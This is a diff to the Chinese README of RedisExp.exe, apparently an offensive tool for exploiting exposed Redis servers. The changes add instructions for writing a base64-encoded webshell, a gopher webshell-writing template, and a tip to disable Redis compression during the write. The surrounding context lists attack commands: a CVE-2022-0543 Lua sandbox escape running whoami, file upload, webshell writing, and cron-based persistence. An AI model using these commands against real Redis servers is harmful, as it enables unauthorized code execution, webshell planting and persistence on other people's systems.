@@ -41,8 +41,9 @@ RedisExp.exe upload -r 192.168.19.1 -L 127.0.0.1 -f shell.php -F shell.txt
 Lua沙盒绕过命令执行 CVE-2022-0543:
 RedisExp.exe lua -r 192.168.19.6 -c whoami
 
-备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置):
+备份写 Webshell (Windows 中文路径要设置gbk, linux 中文路径不用设置。webshell的内容是base64，使用 -b 参数来解码。工具默认会关闭Redis压缩进行写入，写入后再恢复。):
 RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "<?php phpinfo();?>" -g
+RedisExp.exe shell -r 192.168.19.1 -d c:\\中文\\ -f shell.php -s "PD9waHAgcGhwaW5mbygpOz8+" -g -b
 
 Linux 写计划任务:
 RedisExp.exe cron -r 192.168.19.1 -L 127.0.0.1 -P 2222
@@ -58,7 +59,7 @@ RedisExp.exe gopher -f 1.txt
 
 ```
 
-写文件
+gopher 写webshell模板
 ```
 flushall
 config set dir /tmp
@@ -67,10 +68,16 @@ set 'webshell' '<?php phpinfo();?>'
 save
 ```
 
+关闭Redis压缩(写入乱码的时候可以关闭压缩，工具在写入shell的时候默认添加了关闭压缩，写入后再恢复开启压缩)
+```
+config set rdbcompression no
+```
+
 
 1. 具体命令使用 -h 来查看
 2. exp.dll 和 exp.so 来自 https://github.com/0671/RabR 已经把内容分别加载到 dll.go 和 so.go 可以直接调用。
 3. Windows 中文路径需要设置gbk，使用 -g 参数就可以了。
+4. 在写入webshell的时候因为有一些特殊字符，可以使用把webshell进行 base64 编码，然后使用 -b 参数来解码
 
 
 
@@ -96,6 +103,7 @@ save
 - https://github.com/toalaska/redis_tool
 - https://yanghaoi.github.io/2021/10/09/redis-lou-dong-li-yong/
 - https://github.com/firebroo/sec_tools/tree/master/redis-over-gopher
+- [原创 Paper | Windows 与 Java 环境下的 Redis 利用分析](https://mp.weixin.qq.com/s/f7hPOoSSiRJpyMK51_Vxrw)
 
- 
+
 
